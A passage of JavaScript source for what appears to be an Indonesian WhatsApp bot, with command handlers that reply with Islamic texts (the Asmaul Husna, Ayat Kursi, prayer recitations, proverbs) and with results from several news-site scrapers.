translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
translation_en: "The Last"
},
{
index: 75,
latin: "Az Zhaahir",
arabic: "الظَّاهِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
translation_en: "The Manifest; the All Victorious"
},
{
index: 76,
latin: "Al Baathin",
arabic: "الْبَاطِنُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
translation_en: "The Hidden; the All Encompassing"
},
{
index: 77,
latin: "Al Waali",
arabic: "الْوَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
translation_en: "The Patron"
},
{
index: 78,
latin: "Al Muta’aalii",
arabic: "الْمُتَعَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Self Exalted"
},
{
index: 79,
latin: "Al Barri",
arabic: "الْبَرُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
translation_en: "The Most Kind and Righteous"
},
{
index: 80,
latin: "At Tawwaab",
arabic: "التَّوَابُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
translation_en: "The Ever Returning, Ever Relenting"
},
{
index: 81,
latin: "Al Muntaqim",
arabic: "الْمُنْتَقِمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
translation_en: "The Avenger"
},
{
index: 82,
latin: "Al Afuww",
arabic: "العَفُوُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
translation_en: "The Pardoner, the Effacer of Sins"
},
{
index: 83,
latin: "Ar Ra`uuf",
arabic: "الرَّؤُوفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
translation_en: "The Compassionate, the All Pitying"
},
{
index: 84,
latin: "Malikul Mulk",
arabic: "مَالِكُ الْمُلْكِ",
translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
translation_en: "The Owner of All Sovereignty"
},
{
index: 85,
latin: "Dzul JalaaliWal Ikraam",
arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
translation_en: "The Lord of Majesty and Generosity"
},
{
index: 86,
latin: "Al Muqsith",
arabic: "الْمُقْسِطُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Equitable, the Requiter"
},
{
index: 87,
latin: "Al Jamii’",
arabic: "الْجَامِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
translation_en: "The Gatherer, the Unifier"
},
{
index: 88,
latin: "Al Ghaniyy",
arabic: "الْغَنِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
translation_en: "The All Rich, the Independent"
},
{
index: 89,
latin: "Al Mughnii",
arabic: "الْمُغْنِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
translation_en: "The Enricher, the Emancipator"
},
{
index: 90,
latin: "Al Maani",
arabic: "اَلْمَانِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
translation_en: "The Withholder, the Shielder, the Defender"
},
{
index: 91,
latin: "Ad Dhaar",
arabic: "الضَّارَّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
translation_en: "The Distressor, the Harmer"
},
{
index: 92,
latin: "An Nafii’",
arabic: "النَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
translation_en: "The Propitious, the Benefactor"
},
{
index: 93,
latin: "An Nuur",
arabic: "النُّورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
translation_en: "The Light"
},
{
index: 94,
latin: "Al Haadii",
arabic: "الْهَادِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
translation_en: "The Guide"
},
{
index: 95,
latin: "Al Baadii",
arabic: "الْبَدِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
translation_en: "Incomparable, the Originator"
},
{
index: 96,
latin: "Al Baaqii",
arabic: "اَلْبَاقِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
translation_en: "The Ever Enduring and Immutable"
},
{
index: 97,
latin: "Al Waarits",
arabic: "الْوَارِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
translation_en: "The Heir, the Inheritor of All"
},
{
index: 98,
latin: "Ar Rasyiid",
arabic: "الرَّشِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
translation_en: "The Guide, Infallible Teacher, and Knower"
},
{
index: 99,
latin: "As Shabuur",
arabic: "الصَّبُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
translation_en: "The Patient"
}
]
let json = JSON.parse(JSON.stringify(asmaulhusna))
let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
if (isNaN(args[0])) return reply(`contoh:\nasmaulhusna 1`)
if (args[0]) {
if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
return m.reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
}
m.reply(`${contoh} + ${data} + ${anjuran}`)
}
break

case 'ayatkursi': {
let caption = `
*${m2}「 Ayat Kursi 」${m2}*

اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
m.reply(caption)
}
break

case 'bacaansholat': {
const bacaanshalat = {
"result": [
{
 "id": 1,
 "name": "Bacaan Iftitah",
 "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
 "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
 "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
},
{
 "id": 2,
 "name": "Al Fatihah",
 "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَاالصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
 "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
 "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
},
{
 "id": 3,
 "name": "Bacaan Ruku",
 "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
 "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
 "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
},
{
 "id": 4,
 "name": "Bacaan Sujud",
 "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
 "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
 "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
},
{
 "id": 5,
 "name": "Bacaan Duduk Diantara Dua Sujud",
 "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
 "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
 "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
},
{
 "id": 6,
 "name": "Duduk Tasyahud Awal",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
 "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
},
{
 "id": 7,
 "name": "Duduk Tasyahud Akhir",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
 "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
},
{
 "id": 8,
 "name": "Salam",
 "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
 "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
 "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
}
]
}
let bacaan = JSON.stringify(bacaanshalat)
let json = JSON.parse(bacaan)
let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
let contoh = `*${m2}「 Bacaan Shalat 」${m2}*\n\n`
m.reply(`${contoh} + ${data}`)
}
break

case 'doaharian': {
let src = JSON.parse(fs.readFileSync('./lib/doaharian.json', 'utf-8'))
let caption = src.map((v, i) => {
return `
*${i + 1}.* ${v.title}

•°• Latin :
${v.latin}

•°• Arabic :
${v.arabic}

•°• Translate :
${v.translation}
`.trim()
}).join('\n\n')
m.reply(`${caption}`)
}
break

case 'niatsholat': {
if (!q) return reply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
{
index: 1,
solat: "subuh",
latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 2,
solat: "maghrib",
latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 3,
solat: "dzuhur",
latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 4,
solat: "isha",
latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 5,
solat: "ashar",
latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
}
]
let text = q.toLowerCase() || ''
let data = Object.values(niatsholat).find(v => v.solat == text)
if (!data) return m.reply(`*${m2}( ${txt} Tidak Ditemukan )${m2}*\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
m.reply(`
*${m2}Niat Sholat ${text}${m2}*

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}
break

case 'quotesislami': {
const islami = [
{
 "id": "1",
 "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
 "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
},
{
 "id": "2",
 "arabic": "مَنْ صَبَرَ ظَفِرَ",
 "arti": "Barang siapa bersabar, maka dia akan beruntung."
},
{
 "id": "3",
 "arabic": "مَنْ جَدَّ وَجَـدَ",
 "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
},
{
 "id": "4",
 "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
 "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
},
{
 "id": "5",
 "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
 "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
},
{
 "id": 6,
 "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
 "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
},
{
 "id": "7",
 "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
 "arti": "Kesabaran akan menolong segala pekerjaan."
},
{
 "id": "8",
 "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
 "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
},
{
 "id": "9",
 "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
 "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
},
{
 "id": "10",
 "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
 "arti": "Telur hari ini lebih baik daripada ayam esok hari."
},
{
 "id": "11",
 "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
 "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
},
{
 "id": "12",
 "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
 "arti": "Waktu itu lebih berharga daripada emas."
},
{
 "id": "13",
 "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
 "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
},
{
 "id": "14",
 "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
 "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
},
{
 "id": "15",
 "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
 "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
},
{
 "id": "16",
 "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
 "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
},{
 "id": "17",
 "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
 "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
},
{
 "id": "18",
 "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
 "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
},
{
 "id": "19",
 "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
 "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
},
{
 "id": "20",
 "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
 "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
},
{
 "id": "21",
 "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
 "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
},
{
 "id": "22",
 "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
 "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
},
{
 "id": "23",
 "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
 "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
},
{
 "id": "24",
 "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
 "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
},
{
 "id": "25",
 "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
 "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
}
]
const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
m.reply(`${arabic}\n${arti}`)
}
break

case 'doatahlil': {
let { result } = JSON.parse(fs.readFileSync('./database/tahlil.json', 'utf-8'))
let caption = result.map((v, i) => {
return `
*${i + 1}.* ${v.title}

•°• Arabic :
${v.arabic}

•°• Translate :
${v.translation}
`.trim()
}).join('\n\n')
m.reply(`${caption}`)
}
break

//=================================//



 case 'fajar':


FajarNews().then(async(res) => {
console.log(res) 
no = 0
iwan = ""
for (let i of res) {
no += 1
iwan += `\n• ${no.toString()} •\n`
iwan += `Berita: ${i.berita}\n`
iwan += `Upload: ${i.berita_diupload}\n`
iwan += `Jenis: ${i.berita_jenis}\n`
iwan += `Link: ${i.berita_url}\n`
}
iwan += ""
reply(iwan) 
})
break
//=================================================//
case 'cnn':


CNNNews().then(res => {
no = 0
iwann = ""
for (let i of res) {
no += 1
iwann += `\n• ${no.toString()} •\n`
iwann += `Berita: ${i.berita}\n`
iwann += `Link: ${i.berita_url}\n`
}
iwann += ""
reply(iwann) 
})
break
//=================================================//
case 'layarkaca':


if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
break
//=================================================//
case 'cnbc':


CNBCNews().then(async(res) => {
no = 0
iwannnn = ""
for (let i of res) {
no += 1
iwannnn += `\n• ${no.toString()} •\n`
iwannnn += `Berita: ${i.berita}\n`
iwannnn += `Upload: ${i.berita_diupload}\n`
iwannnn += `Link: ${i.berita_url}\n`
}
iwannnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnn }, { quoted:m })
})
break
//=================================================//
case 'tribun':


TribunNews().then(async(res) => {
no = 0
iwannnnn = ""
for (let i of res) {
no += 1
iwannnnn += `\n• ${no.toString()} •\n`
iwannnnn += `Berita: ${i.berita}\n`
iwannnnn += `Upload: ${i.berita_diupload}\n`
iwannnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnn += `Link: ${i.berita_url}\n`
}
iwannnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnn }, { quoted:m })
})
break
//=================================================//
case 'indozone':


IndozoneNews().then(async(res) => {
no = 0
iwannnnnn = ""
for (let i of res) {
no += 1
iwannnnnn += `\n• ${no.toString()} •\n`
iwannnnnn += `Berita: ${i.berita}\n`
iwannnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnn }, { quoted:m })
})
break
//=================================================//
case 'kompas':


KompasNews().then(async(res) => {
no = 0
iwannnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnn += `Berita: ${i.berita}\n`
iwannnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnn }, { quoted:m })
})
break
//=================================================//
case 'detiknews':


DetikNews().then(async(res) => {
no = 0
iwannnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'dailynews':


DailyNews().then(async(res) => {
no = 0
iwannnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'inews':


iNews().then(async(res) => {
no = 0
iwannnnnnnnnn = ""
